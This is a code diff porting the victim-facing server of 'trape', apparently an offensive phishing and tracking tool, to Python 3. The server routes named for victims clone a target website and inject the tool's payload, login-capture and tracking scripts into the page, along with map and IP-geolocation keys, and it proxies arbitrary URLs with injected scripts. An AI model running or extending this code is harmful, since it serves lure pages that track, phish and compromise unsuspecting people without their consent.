@@ -21,6 +21,8 @@ from core.db import Database
 import os
 import sys
 import platform
+import urllib
+import requests
 from multiprocessing import Process
 """
 from bs4 import BeautifulSoup
@@ -38,9 +40,6 @@ db = Database()
 class victim_server(object):
     @app.route("/" + trape.victim_path)
     def homeVictim():
-        opener = urllib2.build_opener()
-        headers = victim_headers(request.user_agent)
-        opener.addheaders = headers
         """
         clone_html  = opener.open(trape.url_to_clone).read()
         soup = BeautifulSoup(clone_html, 'lxml')
@@ -63,10 +62,11 @@ class victim_server(object):
                 if url.startswith('/'):
                     clone_html = clone_html.replace(url, domain + url)
         """
+        r = requests.get(trape.url_to_clone, headers=victim_headers2(request.user_agent))
         if (trape.type_lure == 'local'):
             html = assignScripts(victim_inject_code(render_template("/" + trape.url_to_clone), 'payload', '/', trape.gmaps, trape.ipinfo))
         else:
-            html = assignScripts(victim_inject_code(opener.open(trape.url_to_clone).read(), 'payload', trape.url_to_clone, trape.gmaps, trape.ipinfo))
+            html = assignScripts(victim_inject_code(r.content, 'payload', trape.url_to_clone, trape.gmaps, trape.ipinfo))
         return html
 
     @app.route("/register", methods=["POST"])
@@ -159,7 +159,7 @@ class victim_server(object):
         url = request.args.get('url')
         if url[0:4] != 'http':
             url = 'http://' + url
-        opener = urllib2.build_opener()
+        opener = urllib.request.build_opener()
         headers = victim_headers(request.user_agent)
         opener.addheaders = headers
         html = assignScripts(victim_inject_code(opener.open(url).read(), 'vscript', url, trape.gmaps, trape.ipinfo))
@@ -223,11 +223,11 @@ def getHostsAlive(ip, vId):
         pass
 
 def assignScripts(code):
-    code = code.replace("base.js", trape.JSFiles[0]['src'])
-    code = code.replace("libs.min.js",trape.JSFiles[1]['src'])
-    code = code.replace("login.js", trape.JSFiles[2]['src'])
-    code = code.replace("payload.js", trape.JSFiles[3]['src'])
-    code = code.replace("trape.js", trape.JSFiles[4]['src'])
-    code = code.replace("vscript.js", trape.JSFiles[5]['src'])
-    code = code.replace("custom.js", trape.JSFiles[6]['src'])
+    code = code.replace("base.js".encode(), trape.JSFiles[0]['src'].encode())
+    code = code.replace("libs.min.js".encode(),trape.JSFiles[1]['src'].encode())
+    code = code.replace("login.js".encode(), trape.JSFiles[2]['src'].encode())
+    code = code.replace("payload.js".encode(), trape.JSFiles[3]['src'].encode())
+    code = code.replace("trape.js".encode(), trape.JSFiles[4]['src'].encode())
+    code = code.replace("vscript.js".encode(), trape.JSFiles[5]['src'].encode())
+    code = code.replace("custom.js".encode(), trape.JSFiles[6]['src'].encode())
     return code
